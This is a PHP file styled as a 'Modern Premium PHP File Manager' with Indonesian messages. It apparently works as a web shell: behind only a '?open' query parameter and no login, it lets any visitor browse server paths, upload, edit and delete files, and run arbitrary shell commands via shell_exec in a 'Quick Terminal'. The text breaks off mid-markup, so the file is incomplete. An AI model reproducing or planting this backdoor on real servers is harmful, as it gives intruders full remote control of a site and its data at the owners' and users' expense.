<?php
/**************************************
 * Modern Premium PHP File Manager
 * Compatible with PHP 5.6 to 8.3+
 * UI: Modern, Elegant, Responsive
 **************************************/

// === Require query ?open ===
if (!isset($_GET['open'])) {
    http_response_code(403);
    exit("Access blocked");
}

$BASE_START = __DIR__;
$msg = "";
$error = "";

// === Safe realpath function for all PHP versions ===
function safe_real($p) {
    if (empty($p)) return null;
    $r = realpath($p);
    return $r !== false ? $r : null;
}

// === Get current directory ===
$cwd = isset($_GET['p']) && $_GET['p'] !== '' ? $_GET['p'] : $BASE_START;
$cwd = safe_real($cwd);
if (!$cwd || !is_dir($cwd)) {
    $cwd = $BASE_START;
}

// === Permission helpers ===
function perms_string($path) {
    if (!file_exists($path)) return '---------';
    $p = fileperms($path);
    
    $info = ($p & 0x4000) ? 'd' : '-';
    $info .= ($p & 0x0100) ? 'r' : '-';
    $info .= ($p & 0x0080) ? 'w' : '-';
    $info .= ($p & 0x0040) ? 'x' : '-';
    $info .= ($p & 0x0020) ? 'r' : '-';
    $info .= ($p & 0x0010) ? 'w' : '-';
    $info .= ($p & 0x0008) ? 'x' : '-';
    $info .= ($p & 0x0004) ? 'r' : '-';
    $info .= ($p & 0x0002) ? 'w' : '-';
    $info .= ($p & 0x0001) ? 'x' : '-';
    
    return $info;
}

function get_file_icon($filename, $isDir = false) {
    if ($isDir) return 'folder';
    
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $icons = [
        'php' => 'code-slash',
        'html' => 'filetype-html',
        'css' => 'filetype-css',
        'js' => 'filetype-js',
        'json' => 'filetype-json',
        'txt' => 'file-text',
        'md' => 'markdown',
        'pdf' => 'file-pdf',
        'doc' => 'file-word',
        'docx' => 'file-word',
        'xls' => 'file-excel',
        'xlsx' => 'file-excel',
        'zip' => 'file-zip',
        'rar' => 'file-zip',
        'tar' => 'file-zip',
        'gz' => 'file-zip',
        'jpg' => 'file-image',
        'jpeg' => 'file-image',
        'png' => 'file-image',
        'gif' => 'file-image',
        'svg' => 'file-image',
        'mp3' => 'file-music',
        'wav' => 'file-music',
        'mp4' => 'file-play',
        'avi' => 'file-play',
        'sql' => 'database',
        'log' => 'file-text'
    ];
    
    return isset($icons[$ext]) ? $icons[$ext] : 'file-earmark';
}

function format_size($bytes) {
    if ($bytes < 0) return '0 B';
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = 0;
    while ($bytes >= 1024 && $i < 4) {
        $bytes /= 1024;
        $i++;
    }
    return round($bytes, 2) . ' ' . $units[$i];
}

function get_mime_type($file) {
    if (!file_exists($file) || is_dir($file)) return '';
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    $mimes = [
        'txt' => 'text/plain',
        'html' => 'text/html',
        'php' => 'text/plain',
        'css' => 'text/css',
        'js' => 'text/javascript',
        'json' => 'application/json',
        'xml' => 'application/xml',
        'jpg' => 'image/jpeg',
        'jpeg' => 'image/jpeg',
        'png' => 'image/png',
        'gif' => 'image/gif',
        'svg' => 'image/svg+xml',
        'pdf' => 'application/pdf'
    ];
    return isset($mimes[$ext]) ? $mimes[$ext] : 'application/octet-stream';
}

// === Process actions ===
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    $action = $_POST['action'];
    
    // Upload file
    if ($action === 'upload' && isset($_FILES['files'])) {
        $files = $_FILES['files'];
        $uploadCount = 0;
        
        // Handle multiple files
        if (is_array($files['name'])) {
            for ($i = 0; $i < count($files['name']); $i++) {
                if ($files['error'][$i] === UPLOAD_ERR_OK) {
                    $target = $cwd . '/' . basename($files['name'][$i]);
                    if (move_uploaded_file($files['tmp_name'][$i], $target)) {
                        $uploadCount++;
                    }
                }
            }
            $msg = "$uploadCount file berhasil diupload";
        } else {
            // Single file
            if ($files['error'] === UPLOAD_ERR_OK) {
                $target = $cwd . '/' . basename($files['name']);
                if (move_uploaded_file($files['tmp_name'], $target)) {
                    $msg = "File berhasil diupload";
                }
            }
        }
    }
    
    // Create folder
    if ($action === 'mkdir' && !empty($_POST['folder'])) {
        $folderName = basename(trim($_POST['folder']));
        $target = $cwd . '/' . $folderName;
        if (!file_exists($target)) {
            if (@mkdir($target, 0755, true)) {
                $msg = "Folder '$folderName' berhasil dibuat";
            } else {
                $error = "Gagal membuat folder";
            }
        } else {
            $error = "Folder sudah ada";
        }
    }
    
    // Create file
    if ($action === 'mkfile' && !empty($_POST['filename'])) {
        $fileName = basename(trim($_POST['filename']));
        $target = $cwd . '/' . $fileName;
        if (!file_exists($target)) {
            if (file_put_contents($target, "") !== false) {
                $msg = "File '$fileName' berhasil dibuat";
            } else {
                $error = "Gagal membuat file";
            }
        } else {
            $error = "File sudah ada";
        }
    }
    
    // Rename
    if ($action === 'rename' && !empty($_POST['old']) && !empty($_POST['new'])) {
        $old = safe_real($cwd . '/' . $_POST['old']);
        $new = $cwd . '/' . basename($_POST['new']);
        if ($old && file_exists($old)) {
            if (!file_exists($new)) {
                if (@rename($old, $new)) {
                    $msg = "Berhasil diubah menjadi '" . basename($new) . "'";
                } else {
                    $error = "Gagal mengubah nama";
                }
            } else {
                $error = "Nama sudah ada";
            }
        }
    }
    
    // Delete
    if ($action === 'delete' && !empty($_POST['target'])) {
        $target = safe_real($cwd . '/' . $_POST['target']);
        if ($target && file_exists($target)) {
            if (is_dir($target)) {
                // Try to delete directory recursively
                $success = @rmdir($target);
                if (!$success) {
                    $error = "Folder tidak kosong. Hapus manual melalui terminal";
                } else {
                    $msg = "Folder berhasil dihapus";
                }
            } else {
                if (@unlink($target)) {
                    $msg = "File berhasil dihapus";
                } else {
                    $error = "Gagal menghapus file";
                }
            }
        }
    }
    
    // Save file
    if ($action === 'save' && !empty($_POST['file']) && isset($_POST['content'])) {
        $file = safe_real($cwd . '/' . $_POST['file']);
        if ($file && is_file($file) && is_writable($file)) {
            if (file_put_contents($file, $_POST['content']) !== false) {
                $msg = "File berhasil disimpan";
            } else {
                $error = "Gagal menyimpan file";
            }
        }
    }
    
    // Terminal command
    if ($action === 'terminal' && isset($_POST['cmd'])) {
        $cmd = trim($_POST['cmd']);
        if ($cmd !== '') {
            $output = array();
            $return_var = 0;
            
            // Safe command execution for all PHP versions
            if (function_exists('shell_exec') && !in_array('shell_exec', array_map('trim', explode(', ', ini_get('disable_functions'))))) {
                $full_cmd = "cd " . escapeshellarg($cwd) . " && " . $cmd . " 2>&1";
                $result = shell_exec($full_cmd);
                $terminal_output = $result !== null ? $result : "Perintah tidak menghasilkan output";
            } else {
                $terminal_output = "shell_exec tidak diizinkan pada server ini";
            }
        }
    }
    
    // Redirect for non-terminal actions
    if ($action !== 'terminal') {
        $params = array('open' => '');
        if ($cwd !== $BASE_START) $params['p'] = $cwd;
        if ($msg) $params['msg'] = $msg;
        if ($error) $params['error'] = $error;
        
        header("Location: ?" . http_build_query($params));
        exit;
    }
}

// === Get edit file ===
$editFile = null;
if (isset($_GET['edit'])) {
    $ep = safe_real($cwd . '/' . $_GET['edit']);
    if ($ep && is_file($ep) && is_readable($ep)) {
        $editFile = $ep;
    }
}

// === Get directory items ===
$items = scandir($cwd);
$folders = array();
$files = array();

foreach ($items as $item) {
    if ($item === '.' || $item === '..') continue;
    $fullPath = $cwd . '/' . $item;
    if (is_dir($fullPath)) {
        $folders[] = $item;
    } else {
        $files[] = $item;
    }
}

// Sort naturally
natcasesort($folders);
natcasesort($files);
$allItems = array_merge($folders, $files);

// === Breadcrumb ===
function getBreadcrumbs($path) {
    $parts = explode('/', trim($path, '/'));
    $breadcrumbs = array();
    $accum = '';
    
    foreach ($parts as $part) {
        if ($part === '') continue;
        $accum .= '/' . $part;
        $breadcrumbs[] = array(
            'name' => $part,
            'path' => $accum
        );
    }
    return $breadcrumbs;
}

// === Get server info safely ===
$serverInfo = 'Server: ' . php_uname('s') . ' ' . php_uname('r');
$phpVersion = 'PHP ' . phpversion();

// === Get message from GET ===
if (isset($_GET['msg'])) {
    $msg = $_GET['msg'];
}
if (isset($_GET['error'])) {
    $error = $_GET['error'];
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Modern File Manager</title>
    
    <!-- Bootstrap 5 + Icons -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    
    <!-- Google Fonts - Inter & JetBrains Mono -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
    
    <!-- Custom CSS -->
    <style>
        :root {
            --primary: #3b82f6;
            --primary-dark: #2563eb;
            --primary-light: #60a5fa;
            --secondary: #64748b;
            --success: #10b981;
            --danger: #ef4444;
            --warning: #f59e0b;
            --dark: #0f172a;
            --light: #f8fafc;
            --card-bg: rgba(255, 255, 255, 0.98);
            --shadow-sm: 0 1px 3px 0 rgb(0 0 0 / 0.1), 0 1px 2px -1px rgb(0 0 0 / 0.1);
            --shadow-md: 0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);
            --shadow-lg: 0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1);
            --shadow-xl: 0 20px 25px -5px rgb(0 0 0 / 0.1), 0 8px 10px -6px rgb(0 0 0 / 0.1);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(140deg, #1e1b4b 0%, #0f172a 50%, #020617 100%);
            min-height: 100vh;
            padding: 1.5rem;
            color: var(--dark);
            position: relative;
        }

        /* Animated background */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: radial-gradient(circle at 20% 80%, rgba(59,130,246,0.15) 0%, transparent 50%);
            pointer-events: none;
            z-index: 0;
        }

        /* Modern Glassmorphism Card */
        .glass-card {
            background: var(--card-bg);
            backdrop-filter: blur(10px);
            border-radius: 28px;
            box-shadow: var(--shadow-xl);
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            z-index: 1;
            border: 1px solid rgba(255,255,255,0.2);
        }

        .glass-card:hover {
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.3);
            transform: translateY(-4px);
        }

        /* Server Info Bar */
        .server-info {
            background: linear-gradient(135deg, rgba(30,41,59,0.95), rgba(15,23,42,0.95));
            backdrop-filter: blur(10px);
            color: #e2e8f0;
            border-radius: 100px;
            padding: 0.5rem 1.5rem;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.8rem;
            border: 1px solid rgba(59,130,246,0.3);
            box-shadow: var(--shadow-md);
            display: inline-flex;
            align-items: center;
            gap: 1rem;
        }

        .server-info i {
            color: var(--primary-light);
        }

        /* Modern Breadcrumb */
        .breadcrumb-modern {
            background: rgba(255, 255, 255, 0.6);
            backdrop-filter: blur(8px);
            border-radius: 100px;
            padding: 0.5rem 1.25rem;
            border: 1px solid rgba(255,255,255,0.4);
        }

        .breadcrumb-modern .breadcrumb-item a {
            color: var(--dark);
            font-weight: 600;
            text-decoration: none;
            transition: all 0.2s;
        }

        .breadcrumb-modern .breadcrumb-item a:hover {
            color: var(--primary);
            transform: translateX(2px);
        }

        .breadcrumb-modern .breadcrumb-item.active {
            color: var(--primary);
            font-weight: 700;
        }

        /* Modern Table */
        .table-modern {
            width: 100%;
            border-collapse: separate;
            border-spacing: 0 10px;
        }

        .table-modern thead th {
            background: transparent;
            color: var(--secondary);
            font-weight: 700;
            font-size: 0.7rem;
            text-transform: uppercase;
            letter-spacing: 0.1em;
            padding: 0.75rem 1rem;
            border: none;
        }

        .table-modern tbody tr {
            background: white;
            border-radius: 20px;
            box-shadow: var(--shadow-sm);
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            cursor: pointer;
        }

        .table-modern tbody tr:hover {
            box-shadow: var(--shadow-lg);
            transform: translateY(-2px) scale(1.01);
            background: linear-gradient(135deg, #ffffff, #f8fafc);
        }

        .table-modern tbody td {
            padding: 1rem;
            border: none;
            vertical-align: middle;
        }

        .table-modern tbody tr td:first-child {
            border-top-left-radius: 20px;
            border-bottom-left-radius: 20px;
            padding-left: 1.5rem;
        }

        .table-modern tbody tr td:last-child {
            border-top-right-radius: 20px;
            border-bottom-right-radius: 20px;
            padding-right: 1.5rem;
        }

        /* File/Folder Icons */
        .icon-wrapper {
            width: 44px;
            height: 44px;
            border-radius: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.3rem;
            transition: all 0.3s;
        }

        .icon-folder {
            background: linear-gradient(135deg, #fbbf24, #f59e0b);
            color: white;
            box-shadow: 0 4px 10px rgba(245,158,11,0.3);
        }

        .icon-file {
            background: linear-gradient(135deg, #94a3b8, #64748b);
            color: white;
            box-shadow: 0 4px 10px rgba(100,116,139,0.3);
        }

        .file-name {
            font-weight: 700;
            color: var(--dark);
            text-decoration: none;
            transition: all 0.2s;
        }

        .file-name:hover {
            color: var(--primary);
            transform: translateX(4px);
            display: inline-block;
        }

        /* Buttons */
        .btn-modern {
            border-radius: 100px !important;
            padding: 0.6rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
            border: none;
            box-shadow: var(--shadow-sm);
            letter-spacing: 0.3px;
        }

        .btn-modern-sm {
            padding: 0.3rem 1rem;
            font-size: 0.8rem;
        }

        .btn-modern-primary {
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            color: white;
            position: relative;
            overflow: hidden;
        }

        .btn-modern-primary::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 0;
            height: 0;
            border-radius: 50%;
            background: rgba(255,255,255,0.3);
            transform: translate(-50%, -50%);
            transition: width 0.6s, height 0.6s;
        }

        .btn-modern-primary:hover::before {
            width: 300px;
            height: 300px;
        }

        .btn-modern-primary:hover {
            background: linear-gradient(135deg, var(--primary-dark), var(--primary));
            transform: translateY(-2px);
            box-shadow: var(--shadow-md);
            color: white;
        }

        .btn-modern-outline {
            background: rgba(255,255,255,0.9);
            border: 1px solid #e2e8f0;
            color: var(--dark);
        }

        .btn-modern-outline:hover {
            background: white;
            border-color: var(--primary);
            color: var(--primary);
            transform: translateY(-1px);
            box-shadow: var(--shadow-sm);
        }

        /* Form Controls */
        .form-control-modern {
            border-radius: 100px !important;
            border: 2px solid #e2e8f0;
            padding: 0.7rem 1.25rem;
            font-size: 0.9rem;
            transition: all 0.2s;
            background: white;
            font-weight: 500;
        }

        .form-control-modern:focus {
            border-color: var(--primary);
            box-shadow: 0 0 0 4px rgba(59,130,246,0.1);
            outline: none;
        }

        /* Terminal */
        .terminal-box {
            background: #0f172a;
            border-radius: 24px;
            padding: 1.25rem;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.85rem;
            color: #a5f3fc;
            border: 1px solid #334155;
            box-shadow: var(--shadow-lg);
            margin-top: 1rem;
        }

        .terminal-box pre {
            color: #a5f3fc;
            margin: 0;
            white-space: pre-wrap;
            word-wrap: break-word;
        }

        /* Alert */
        .alert-modern {
            border-radius: 20px;
            border: none;
            padding: 1rem 1.5rem;
            box-shadow: var(--shadow-md);
            backdrop-filter: blur(10px);
            font-weight: 600;
        }

        .alert-success {
            background: linear-gradient(135deg, #d1fae5, #a7f3d0);
            color: #065f46;
            border-left: 4px solid var(--success);
        }

        .alert-danger {
            background: linear-gradient(135deg, #fee2e2, #fecaca);
            color: #991b1b;
            border-left: 4px solid var(--danger);
        }

        /* Progress bar for upload */
        .upload-progress {
            height: 4px;
            background: #e2e8f0;
            border-radius: 100px;
            overflow: hidden;
            margin-top: 0.5rem;
        }

        .upload-progress-bar {
            height: 100%;
            background: linear-gradient(90deg, var(--primary), var(--primary-dark));
            width: 0%;
            transition: width 0.3s;
        }

        /* Badge styling */
        .badge-modern {
            background: linear-gradient(135deg, #f1f5f9, #e2e8f0);
            color: var(--dark);
            padding: 0.4rem 1rem;
            border-radius: 100px;
            font-weight: 600;
            font-size: 0.7rem;
        }

        /* Responsive */
        @media (max-width: 768px) {
            body {
                padding: 0.75rem;
            }
            
            .server-info {
                font-size: 0.65rem;
                padding: 0.4rem 1rem;
                flex-wrap: wrap;
            }
            
            .table-modern tbody td {
                padding: 0.75rem 0.5rem;
            }
            
            .icon-wrapper {
                width: 36px;
                height: 36px;
                font-size: 1rem;
            }
            
            .btn-modern-sm {
                padding: 0.2rem 0.6rem;
                font-size: 0.7rem;
            }
        }

        /* Animations */
        @keyframes slideInUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }

        @keyframes pulse {
            0%, 100% {
                opacity: 1;
            }
            50% {
                opacity: 0.5;
            }
        }

        .animate-slide-in {
            animation: slideInUp 0.4s cubic-bezier(0.4, 0, 0.2, 1) forwards;
        }

        .animate-fade-in {
            animation: fadeIn 0.3s ease forwards;
        }

        /* Custom scrollbar */
        ::-webkit-scrollbar {
            width: 10px;
            height: 10px;
        }

        ::-webkit-scrollbar-track {
            background: rgba(241,245,249,0.5);
            border-radius: 10px;
        }

        ::-webkit-scrollbar-thumb {
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            border-radius: 10px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: var(--primary-dark);
        }

        /* Modal styling */
        .modal-content {
            border-radius: 28px !important;
            border: none;
            box-shadow: var(--shadow-xl);
        }

        .modal-header {
            border-bottom: 2px solid #f1f5f9;
        }

        .modal-footer {
            border-top: 2px solid #f1f5f9;
        }
    </style>
</head>
<body>
    <div class="container-fluid px-0 px-lg-3">
        <!-- Header -->
        <div class="d-flex flex-column flex-lg-row align-items-start align-items-lg-center justify-content-between gap-3 mb-4 animate-slide-in">
            <div class="d-flex align-items-center gap-3">
                <div class="icon-wrapper icon-folder" style="width: 56px; height: 56px; font-size: 1.8rem;">
                    <i class="bi bi-cloud-upload-fill"></i>
                </div>
                <div>
                    <h1 class="display-5 fw-bold mb-0" style="color: white; text-shadow: 0 4px 20px rgba(0,0,0,0.2); letter-spacing: -0.5px;">
                        File Manager
                    </h1>
                    <p class="text-white-50 mt-2 mb-0" style="font-size: 0.9rem;">
                        <i class="bi bi-lightning-charge-fill text-warning"></i> modern · elegant · responsive
                    </p>
                </div>
            </div>
            <div class="server-info">
                <i class="bi bi-cpu"></i>
                <span><?php echo htmlspecialchars($serverInfo); ?></span>
                <i class="bi bi-dot"></i>
                <i class="bi bi-code-square"></i>
                <span><?php echo htmlspecialchars($phpVersion); ?></span>
            </div>
        </div>

        <!-- Alerts -->
        <?php if ($msg): ?>
        <div class="alert alert-modern alert-success alert-dismissible fade show animate-slide-in mb-4" role="alert">
            <i class="bi bi-check-circle-fill me-2"></i>
            <strong>Berhasil!</strong> <?php echo htmlspecialchars($msg); ?>
            <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
        </div>
        <?php endif; ?>

        <?php if ($error): ?>
        <div class="alert alert-modern alert-danger alert-dismissible fade show animate-slide-in mb-4" role="alert">
            <i class="bi bi-exclamation-triangle-fill me-2"></i>
            <strong>Error!</strong> <?php echo htmlspecialchars($error); ?>
            <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
        </div>
        <?php endif; ?>

        <!-- Main Content -->
        <div class="glass-card p-4 mb-4 animate-slide-in">
            <!-- Breadcrumb & Actions -->
            <div class="row g-3 align-items-center mb-4">
                <div class="col-lg-6">
                    <nav aria-label="breadcrumb" class="breadcrumb-modern">
                        <ol class="breadcrumb mb-0">
                            <li class="breadcrumb-item">
                                <a href="?open&p=<?php echo urlencode($BASE_START); ?>">
                                    <i class="bi bi-house-door-fill me-1"></i> Home
                                </a>
                            </li>
                            <?php foreach (getBreadcrumbs($cwd) as $b): ?>
                            <li class="breadcrumb-item">
                                <a href="?open&p=<?php echo urlencode($b['path']); ?>">
                                    <i class="bi bi-folder2 me-1"></i>
                                    <?php echo htmlspecialchars($b['name']); ?>
                                </a>
                            </li>
                            <?php endforeach; ?>
                        </ol>
                    </nav>
                </div>
                <div class="col-lg-6">
                    <div class="d-flex flex-wrap gap-2 justify-content-lg-end">
                        <!-- Upload Form -->
                        <form method="post" enctype="multipart/form-data" class="d-flex gap-2">
                            <input type="hidden" name="action" value="upload">
                            <input type="file" name="files[]" multiple class="form-control form-control-modern" style="width: 220px;">
                            <button type="submit" class="btn btn-modern btn-modern-primary">
                                <i class="bi bi-cloud-upload me-1"></i> Upload
                            </button>
                        </form>

                        <!-- New Folder -->
                        <button type="button" class="btn btn-modern btn-modern-outline" data-bs-toggle="modal" data-bs-target="#newFolderModal">
                            <i class="bi bi-folder-plus me-1"></i> Folder
                        </button>

                        <!-- New File -->
                        <button type="button" class="btn btn-modern btn-modern-outline" data-bs-toggle="modal" data-bs-target="#newFileModal">
                            <i class="bi bi-file-plus me-1"></i> File
                        </button>
                    </div>
                </div>
            </div>

            <!-- Terminal -->
            <div class="mb-4">
                <div class="d-flex align-items-center gap-2 mb-3">
                    <div class="icon-wrapper icon-file" style="width: 36px; height: 36px;">
                        <i class="bi bi-terminal-fill"></i>
                    </div>
                    <h5 class="fw-bold mb-0">Quick Terminal</h5>
                    <span class="badge-modern">
                        <i class="bi bi-folder2 me-1"></i> <?php echo htmlspecialchars(basename($cwd)); ?>
                    </span>
                </div>
                
                <form method="post">
                    <input type="hidden" name="action" value="terminal">
                    <div class="input-group">
                        <span class="input-group-text bg-white border-end-0 rounded-start-pill">
                            <i class="bi bi-chevron-right text-primary fw-bold"></i>
                        </span>
                        <input type="text" name="cmd" class="form-control form-control-modern border-start-0" 
                               placeholder="ls -la | pwd | php -v" autocomplete="off">
                        <button type="submit" class="btn btn-modern btn-modern-primary">
                            <i class="bi bi-play-fill me-1"></i> Execute
                        </button>
                    </div>
                </form>

                <?php if (isset($terminal_output)): ?>
                <div class="terminal-box animate-slide-in">
                    <div class="d-flex align-items-center gap-2 mb-2 pb-2 border-bottom border-secondary">
                        <i class="bi bi-terminal text-primary"></i>
                        <span class="text-primary fw-bold">Output:</span>
                    </div>
                    <pre><?php echo htmlspecialchars($terminal_output); ?></pre>
                </div>
                <?php endif; ?>
            </div>

            <!-- File Editor -->
            <?php if ($editFile): ?>
            <div class="mb-4 animate-slide-in">
                <div class="d-flex align-items-center gap-2 mb-3">
                    <div class="icon-wrapper icon-file" style="width: 36px; height: 36px;">
                        <i class="bi bi-pencil-square"></i>
                    </div>
                    <h5 class="fw-bold mb-0">Editing: <?php echo htmlspecialchars(basename($editFile)); ?></h5>
                </div>
                
                <form method="post">
                    <input type="hidden" name="action" value="save">
                    <input type="hidden" name="file" value="<?php echo htmlspecialchars($_GET['edit']); ?>">
                    <textarea name="content" class="form-control" rows="15" 
                              style="font-family: 'JetBrains Mono', monospace; border-radius: 20px; border: 2px solid #e2e8f0; padding: 1rem;"><?php 
                        echo htmlspecialchars(file_get_contents($editFile)); 
                    ?></textarea>
                    
                    <div class="mt-3 d-flex gap-2">
                        <button type="submit" class="btn btn-modern btn-modern-primary">
                            <i class="bi bi-save me-2"></i> Save Changes
                        </button>
                        <a href="?open&p=<?php echo urlencode($cwd); ?>" class="btn btn-modern btn-modern-outline">
                            <i class="bi bi-x-lg me-2"></i> Cancel
                        </a>
                    </div>
                </form>
            </div>
            <?php endif; ?>

            <!-- File List -->
            <div>
                <div class="d-flex align-items-center gap-2 mb-3">
                    <div class="icon-wrapper icon-folder" style="width: 36px; height: 36px;">
                        <i class="bi bi-grid-3x3-gap-fill"></i>
                    </div>
                    <h5 class="fw-bold mb-0">File Explorer</h5>
                    <span class="badge-modern">
                        <i class="bi bi-files me-1"></i> <?php echo count($allItems); ?> items
                    </span>
                </div>

                <div class="table-responsive">
                    <table class="table-modern">
                        <thead>
                            <tr>
                                <th>Name</th>
                                <th>Type</th>
                                <th>Size</th>
                                <th>Permissions</th>
                                <th>Modified</th>
                                <th class="text-end">Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach ($allItems as $item): 
                                $fullPath = $cwd . '/' . $item;
                                $isDir = is_dir($fullPath);
                                $icon = get_file_icon($item, $isDir);
                                $perms = perms_string($fullPath);
                                $size = $isDir ? '—' : format_size(filesize($fullPath));
                                $modified = date('d M Y H:i', filemtime($fullPath));
                            ?>
                            <tr class="animate-fade-in">
                                <td>
                                    <div class="d-flex align-items-center gap-3">
                                        <div class="icon-wrapper <?php echo $isDir ? 'icon-folder' : 'icon-file'; ?>">
                                            <i class="bi bi-<?php echo $icon; ?>"></i>
                                        </div>
                                        <?php if ($isDir): ?>
                                        <a href="?open&p=<?php echo urlencode($fullPath); ?>" class="file-name">
                                            <?php echo htmlspecialchars($item); ?>
                                        </a>
                                        <?php else: ?>
                                        <span class="file-name"><?php echo htmlspecialchars($item); ?></span>
                                        <?php endif; ?>
                                    </div>
                                </td>
                                <td>
                                    <span class="badge-modern">
                                        <?php echo $isDir ? '<i class="bi bi-folder-fill me-1"></i> Folder' : '<i class="bi bi-file-earmark-code me-1"></i> ' . strtoupper(pathinfo($item, PATHINFO_EXTENSION)); ?>
                                    </span>
                                </td>
                                <td class="fw-bold"><?php echo $size; ?></td>
                                <td><code class="text-secondary bg-light p-1 rounded"><?php echo $perms; ?></code></td>
                                <td class="text-secondary"><?php echo $modified; ?></td>
                                <td class="text-end">
                                    <div class="d-flex gap-1 justify-content-end">
                                        <?php if (!$isDir): ?>
                                        <a href="?open&p=<?php echo urlencode($cwd); ?>&edit=<?php echo urlencode($item); ?>" 
                                           class="btn btn-modern btn-modern-outline btn-modern-sm" title="Edit File">
                                            <i class="bi bi-pencil"></i>
                                        </a>
                                        <?php endif; ?>
                                        
                                        <button type="button" class="btn btn-modern btn-modern-outline btn-modern-sm" 
                                                data-bs-toggle="modal" data-bs-target="#renameModal<?php echo md5($item); ?>" 
                                                title="Rename">
                                            <i class="bi bi-pencil-square"></i>
                                        </button>
                                        
                                        <form method="post" class="d-inline" 
                                              onsubmit="return confirm('Delete this <?php echo $isDir ? 'folder' : 'file'; ?>? This action cannot be undone.')">
                                            <input type="hidden" name="action" value="delete">
                                            <input type="hidden" name="target" value="<?php echo htmlspecialchars($item); ?>">
                                            <button type="submit" class="btn btn-modern btn-modern-outline btn-modern-sm" title="Delete">
                                                <i class="bi bi-trash text-danger"></i>
                                            </button>
                                        </form>
                                    </div>

                                    <!-- Rename Modal -->
                                    <div class="modal fade" id="renameModal<?php echo md5($item); ?>" tabindex="-1">
                                        <div class="modal-dialog modal-dialog-centered">
                                            <div class="modal-content">
                                                <div class="modal-header border-0 pb-0">
                                                    <h5 class="modal-title fw-bold">
                                                        <i class="bi bi-pencil-square text-primary me-2"></i>
                                                        Rename Item
                                                    </h5>
                                                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                                                </div>
                                                <form method="post">
                                                    <div class="modal-body">
                                                        <input type="hidden" name="action" value="rename">
                                                        <input type="hidden" name="old" value="<?php echo htmlspecialchars($item); ?>">
                                                        <div class="mb-3">
                                                            <label class="form-label fw-semibold">New Name</label>
                                                            <input type="text" name="new" class="form-control form-control-modern" 
                                                                   value="<?php echo htmlspecialchars($item); ?>" required>
                                                            <small class="text-muted mt-2 d-block">
                                                                <i class="bi bi-info-circle"></i> Enter the new name for this item
                                                            </small>
                                                        </div>
                                                    </div>
                                                    <div class="modal-footer border-0 pt-0">
                                                        <button type="button" class="btn btn-modern btn-modern-outline" data-bs-dismiss="modal">
                                                            Cancel
                                                        </button>
                                                        <button type="submit" class="btn btn-modern btn-modern-primary">
                                                            <i class="bi bi-check-lg me-1"></i> Save
                                                        </button>
                                                    </div>
                                                </form>
                                            </div>
                                        </div>
                                    </div>
                                 </td>
                            </tr>
                            <?php endforeach; ?>

                            <?php if (empty($allItems)): ?>
                            <tr>
                                <td colspan="6" class="text-center py-5">
                                    <div class="icon-wrapper icon-folder mx-auto mb-3" style="width: 80px; height: 80px; font-size: 2.5rem;">
                                        <i class="bi bi-folder-x"></i>
                                    </div>
                                    <h5 class="text-secondary mb-2">Empty Directory</h5>
                                    <p class="text-secondary small mb-0">Create a new folder or upload files to get started</p>
                                </td>
                            </tr>
                            <?php endif; ?>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>

        <!-- Footer -->
        <div class="text-center mt-4 animate-fade-in">
            <p class="text-white-50 small mb-0">
                <i class="bi bi-droplet-fill me-1 text-primary"></i>
                Modern PHP File Manager · Compatible with PHP 5.6 to 8.3+
            </p>
        </div>
    </div>

    <!-- New Folder Modal -->
    <div class="modal fade" id="newFolderModal" tabindex="-1">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">
                <div class="modal-header border-0 pb-0">
                    <h5 class="modal-title fw-bold">
                        <i class="bi bi-folder-plus text-primary me-2"></i>
                        Create New Folder
                    </h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <form method="post">
                    <div class="modal-body">
                        <input type="hidden" name="action" value="mkdir">
                        <div class="mb-3">
                            <label class="form-label fw-semibold">Folder Name</label>
                            <input type="text" name="folder" class="form-control form-control-modern" 
                                   placeholder="e.g., images, documents" required>
                            <small class="text-muted mt-2 d-block">
                                <i class="bi bi-info-circle"></i> Enter a name for the new folder
                            </small>
                        </div>
                    </div>
                    <div class="modal-footer border-0 pt-0">
                        <button type="button" class="btn btn-modern btn-modern-outline" data-bs-dismiss="modal">
                            Cancel
                        </button>
                        <button type="submit" class="btn btn-modern btn-modern-primary">
